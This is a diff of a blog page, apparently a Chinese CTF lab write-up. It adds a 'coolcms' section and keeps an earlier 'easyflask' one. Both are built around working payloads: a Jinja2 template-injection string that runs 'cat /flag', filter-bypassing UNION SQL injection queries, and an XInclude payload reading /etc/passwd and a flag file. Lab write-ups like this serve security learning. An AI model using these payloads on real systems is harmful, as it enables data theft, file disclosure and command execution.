@@ -28,8 +28,13 @@
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://s41.ax1x.com/2025/12/23/pZ87seK.png">
 <meta property="og:image" content="https://cdn4.winhlb.com/2025/12/23/694a34a4ad5eb.png">
+<meta property="og:image" content="https://s41.ax1x.com/2025/12/31/pZNUMv9.png">
+<meta property="og:image" content="https://s41.ax1x.com/2025/12/31/pZNUsVP.png">
+<meta property="og:image" content="https://s41.ax1x.com/2025/12/31/pZNUL24.png">
+<meta property="og:image" content="https://s41.ax1x.com/2026/01/01/pZNfg0K.png">
+<meta property="og:image" content="https://s41.ax1x.com/2026/01/01/pZNhANF.png">
 <meta property="article:published_time" content="2025-12-23T03:40:13.000Z">
-<meta property="article:modified_time" content="2025-12-23T14:38:05.844Z">
+<meta property="article:modified_time" content="2026-01-01T04:40:20.811Z">
 <meta property="article:author" content="My0n9s">
 <meta property="article:tag" content="内部靶场">
 <meta name="twitter:card" content="summary">
@@ -115,7 +120,7 @@
       <div class="sidebar-panel-container">
         <!--noindex-->
         <div class="post-toc-wrap sidebar-panel">
-            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#easyflask1"><span class="nav-number">1.</span> <span class="nav-text">easyflask1</span></a></li></ol></div>
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#easyflask1"><span class="nav-number">1.</span> <span class="nav-text">easyflask1</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#coolcms"><span class="nav-number">2.</span> <span class="nav-text">coolcms</span></a></li></ol></div>
         </div>
         <!--/noindex-->
 
@@ -196,9 +201,15 @@
         <i class="far fa-calendar"></i>
       </span>
       <span class="post-meta-item-text">Posted on</span>
-      
 
-      <time title="Created: 2025-12-23 11:40:13 / Modified: 22:38:05" itemprop="dateCreated datePublished" datetime="2025-12-23T11:40:13+08:00">2025-12-23</time>
+      <time title="Created: 2025-12-23 11:40:13" itemprop="dateCreated datePublished" datetime="2025-12-23T11:40:13+08:00">2025-12-23</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2026-01-01 12:40:20" itemprop="dateModified" datetime="2026-01-01T12:40:20+08:00">2026-01-01</time>
     </span>
 
   
@@ -226,6 +237,50 @@
 <p>发现是可以的，最后再把命令换成 <code>cat /flag</code>即可。</p>
 <p><code>&#123;&#123;((QAQ|attr(()|select|string|batch(25)|first|last+()|select|string|batch(25)|first|last+'eq'+()|select|string|batch(25)|first|last+()|select|string|batch(25)|first|last))[()|select|string|batch(25)|first|last+()|select|string|batch(25)|first|last+'globals'+()|select|string|batch(25)|first|last+()|select|string|batch(25)|first|last]['sys']['modules']['os']['popen']('cat /flag'))['read']()&#125;&#125;</code></p>
 <p><img src="https://cdn4.winhlb.com/2025/12/23/694a34a4ad5eb.png" alt="easyflask2.png"></p>
+<h1 id="coolcms"><a href="#coolcms" class="headerlink" title="coolcms"></a>coolcms</h1><p><code>http://10.45.1.21/article.php?id=-1&#39;union%0bselect * from (select 1)x join (select 2)y join (select 3)z join (select m.4 from (select * from (select 1)a join (select 2)b join (select 3)c join (select 4)d union%0bselect * from flag)m limit 1 offset 1)h%23</code></p>
+<p><code>about</code>页面存在sql注入，有回显，可以尝试union 联合注入。fuzz一下 发现<code>union, or and</code> 啥的都被过滤了。</p>
+<p><a target="_blank" rel="noopener" href="https://imgchr.com/i/pZNUMv9"><img src="https://s41.ax1x.com/2025/12/31/pZNUMv9.png" alt="pZNUMv9.png"></a></p>
+<p>过滤了<code>,</code>可以尝试<code>join</code>，用<code>join</code>来连接临时表，先尝试第一个验证poc:</p>
+<p><code>http://10.45.1.21/article.php?id=-1&#39;union%0bselect * from (select 1) a join (select 2)b join (select 3)c join (select 4)d%23</code></p>
+<p>(select 1)a : select 1 产生一个临时表，别名为 a ；</p>
+<p>这里假设列数只有一列开始测试，然后接着猜测有两列，三列，四列：</p>
+<p><code>?id=-1&#39;union%0bselect * from (select 1)x%23</code></p>
+<p><code>?id=-1&#39;union%0bselect * from (select 1)x join (select 2)y%23</code></p>
+<p><code>?id=-1&#39;union%0bselect * from (select 1)x join (select 2)y join (select 3)z%23</code></p>
+<p><code>?id=-1&#39;union%0bselect * from (select 1)x join (select 2)y join (select 3)z join (select 4)h%23</code></p>
+<p><a target="_blank" rel="noopener" href="https://imgchr.com/i/pZNUsVP"><img src="https://s41.ax1x.com/2025/12/31/pZNUsVP.png" alt="pZNUsVP.png"></a></p>
+<p>发现2，4是回显位；</p>
+<p>正常的<code>information_schema.tables</code> 和<code>information_schema.columns</code> 用不了，因为<code>or</code>被过滤了，<code>information_schema.tables</code>的平替可以用<code>mysql.innodb_table_stats</code>和<code>mysql.innodb_index_stats</code> </p>
+<p>但是这里的<code>table</code>被过滤了，<code>mysql.innodb_table_stats</code> 不能用，测试发现<code>mysql.innodb_index_stats</code>可以用，但是<code>table</code>被过滤了，直接查<code>select group_concat(table_name)from mysql.innodb_index_stats where table_schema=database();</code> 也是不行的。所以这里的表名只能靠猜：</p>
+<p><a target="_blank" rel="noopener" href="https://imgchr.com/i/pZNUL24"><img src="https://s41.ax1x.com/2025/12/31/pZNUL24.png" alt="pZNUL24.png"></a></p>
+<p>可能存在<code>flag</code>表，但是<code>flag</code>表的列名是不知道的，但是<code>count</code>没被过滤，我们可以尝试<code>select count(*) from flag</code>来得到flag表的行数：</p>
+<p><code>?id=-1&#39;union%0bselect * from (select 1)x join (select count(*) from flag)y join (select 3)z join (select 4)h%23</code></p>
+<p>发现返回的是<code>1</code> ，但是无列名注入得需要知道flag表的列数。我们可以尝试<code>select count(*) from information.columns where table_name=&quot;flag&quot;</code>，但是这里<code>or	 table</code> 都被过滤了，好像就只能靠猜测了。</p>
+<p>就从flag表只有一列开始猜起，然后是二列，三列，四列 ….：</p>
+<p><code>?id=-1&#39;union%0bselect * from (select 1)x join (select m.1 from(select * from (select 1)a union%0bselect * from flag)m limit 1)y join (select 3)z join (select 4)h%23</code>  返回<code>404 not found</code></p>
+<p><code>?id=-1&#39;union%0bselect * from (select 1)x join (select m.1 from(select * from (select 1)a join (select 2)b union%0bselect * from flag)m limit 1)y join (select 3)z join (select 4)h%23 </code> 返回<code>404 not found</code></p>
+<p><code>?id=-1&#39;union%0bselect * from (select 1)x join (select m.1 from(select * from (select 1)a join (select 2)b join (select 3)c union%0bselect * from flag)m limit 1)y join (select 3)z join (select 4)h%23</code>  返回 <code>404 not found</code></p>
+<p><code>?id=-1&#39;union%0bselect * from (select 1)x join (select m.1 from(select * from (select 1)a join (select 2)b join (select 3)c join (select 4)d union%0bselect * from flag)m limit 1)y join (select 3)z join (select 4)h%23</code>，此时是有返回值的：</p>
+<p><a target="_blank" rel="noopener" href="https://imgchr.com/i/pZNfg0K"><img src="https://s41.ax1x.com/2026/01/01/pZNfg0K.png" alt="pZNfg0K.png"></a></p>
+<p>从这里可以知道flag表有4列，结合前面的行数1行，这个表就是1行四列。</p>
+<p>解释几个地方：</p>
+<ol>
+<li><code>select m.1 from(select * from (select 1)a join (select 2)b join (select 3)c join (select 4)d union%0bselect * from flag)m limit 1</code> 这种写法是OK的，而交换一下位置：<code>select m.1 from (select * from flag union select * from (select 1)a join (select 2)b join (select 3)c join (select 4)d)m limit 1</code> 这样是不行的，因为我们不知道flag具体的列名，只能把构造的临时表写在左边，让其列名可控。不然<code>m.1</code>直接报错。</li>
+<li>为啥是<code>m.1</code>，直接<code>select *</code> 不行吗？另外为啥后面还有一个<code>limit 1</code>  ? 这个是因为我们要保证每一个回显位，这里是2和4，查询的结果集是个<code>1x1</code>的表。所以需要只返回某个列名的第一条数据。否则会报错，看不到回显。</li>
+<li>另外我们还需要用到<code>offset 1</code> ，我们构造的临时表和flag表进行拼接，第一行数据我们构造的临时表的数据，即 1,2,3,4，所以往下取一行才能取到flag。</li>
+<li>因为flag表只有一行，并且只有4列。那么理论来说就只有4个数据，我们可以一个一个遍历：<code>m.1</code>;<code>m.2</code>;<code>m.3</code>;<code>m.4</code></li>
+</ol>
+<p>测试的poc:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27;union%0bselect * from (select 1)x join (select m.1 from(select * from (select 1)a join (select 2)b join (select 3)c join (select 4)d union%0bselect * from flag)m limit 1 offset 1)y join (select 3)z join (select 4)h%23 //返回的是1</span><br><span class="line">?id=-1&#x27;union%0bselect * from (select 1)x join (select m.2 from(select * from (select 1)a join (select 2)b join (select 3)c join (select 4)d union%0bselect * from flag)m limit 1 offset 1)y join (select 3)z join (select 4)h%23//返回的是fllllaaagggg</span><br><span class="line">id=-1&#x27;union%0bselect * from (select 1)x join (select m.3 from(select * from (select 1)a join (select 2)b join (select 3)c join (select 4)d union%0bselect * from flag)m limit 1 offset 1)y join (select 3)z join (select 4)h%23</span><br><span class="line">//返回的是1</span><br><span class="line">id=-1&#x27;union%0bselect * from (select 1)x join (select m.4 from(select * from (select 1)a join (select 2)b join (select 3)c join (select 4)d union%0bselect * from flag)m limit 1 offset 1)y join (select 3)z join (select 4)h%23</span><br><span class="line">//返回的是/home/fff123aggg</span><br></pre></td></tr></table></figure>
+
+<p>  可以猜测这个第四列，告诉我们的是flag具体的位置，所以这里需要有办法去读。</p>
+<p>我们还有一个功能点<code>write</code>没用，那里其实是个<code>xxe</code>我一开始想的是<code>xss</code>，后面试了一下外部实体注入也没成功。最后看了<code>wp</code>发现这里是用<code>xinclude</code> ，这里用最基础的就行，没有任何过滤。xxe还是不够敏感，后面专门开一个帖子归纳一下xxe。</p>
+<p>poc:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;root&gt;</span><br><span class="line">  &lt;xi:include xmlns:xi=&quot;http://www.w3.org/2001/XInclude&quot; href=&quot;file:///etc/passwd&quot; parse=&quot;text&quot;/&gt;</span><br><span class="line">&lt;/root&gt;</span><br></pre></td></tr></table></figure>
+
+<p>最终的poc:</p>
+<p><code>&lt;root&gt;   &lt;xi:include xmlns:xi=&quot;http://www.w3.org/2001/XInclude&quot; href=&quot;file:///home/fff123aggg&quot; parse=&quot;text&quot;/&gt; &lt;/root&gt;</code></p>
+<p><a target="_blank" rel="noopener" href="https://imgchr.com/i/pZNhANF"><img src="https://s41.ax1x.com/2026/01/01/pZNhANF.png" alt="pZNhANF.png"></a></p>
 
     </div>
 
@@ -266,7 +321,7 @@
 
   <div class="copyright">
     &copy; 
-    <span itemprop="copyrightYear">2025</span>
+    <span itemprop="copyrightYear">2026</span>
     <span class="with-love">
       <i class="fa fa-heart"></i>
     </span>
